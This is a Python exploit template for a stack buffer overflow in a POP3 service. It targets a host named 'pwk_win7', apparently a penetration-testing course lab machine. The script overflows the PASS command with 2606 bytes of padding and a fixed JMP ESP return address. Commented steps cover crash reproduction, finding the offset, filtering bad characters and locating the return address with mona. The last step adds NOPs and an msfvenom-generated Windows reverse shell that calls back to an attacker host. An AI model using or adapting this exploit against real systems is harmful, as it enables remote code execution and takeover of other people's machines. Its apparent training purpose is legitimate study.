import socket
import struct

buf = b''
nops = b'\x90'*20

# MODIFY
host = 'pwk_win7'
port = 110
padding = b'A'*2606
badchars = b'\x00'
jmp_esp = struct.pack('<I',0x080414c3)

s = socket.socket()
s.connect((host,port))

payload = b''
payload += b'user test\r\n'
s.recv(1024)
s.send(payload)
payload = b'pass '

# # 1. reproduce crash
# payload += b'A'*3900 + b'\r\n'

# #  2. offset to RIP
# cyclic = b''
# payload += cyclic + b'\r\n'

# # 3. check eip control
# payload += padding
# payload += b'B'*4

# # 4. badchars
# # !mona config -set workingfolder c:\logs\%p
# # !mona bytearray –cpb badchars
# # !mona compare -f C:\logs\%p\bitearray.txt -a ADDRESS
# chars = bytes([i for i in range(0x100)])
# chars = chars.translate(None,badchars)
# payload += padding
# payload += chars

# # 5. find jmp esp
# # !mona jmp -r esp -cpb BADCHARS
# # !mona modules
# # !mona jmp -r esp -m MODULE -cpb BADCHARS
# # !mona find -s "\xff\xe4" -m MODULE -cpb BADCHARS
# payload += padding
# payload += jmp_esp
# payload += b'\xcc'*4

# # 6. final payload
# # msfvenom -p windows/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f python -b badchars
# payload += padding
# payload += jmp_esp
# payload += nops
# payload += shellcode
# payload += b'\n'

payload += b'\r\n'
s.recv(1024)
s.send(payload)
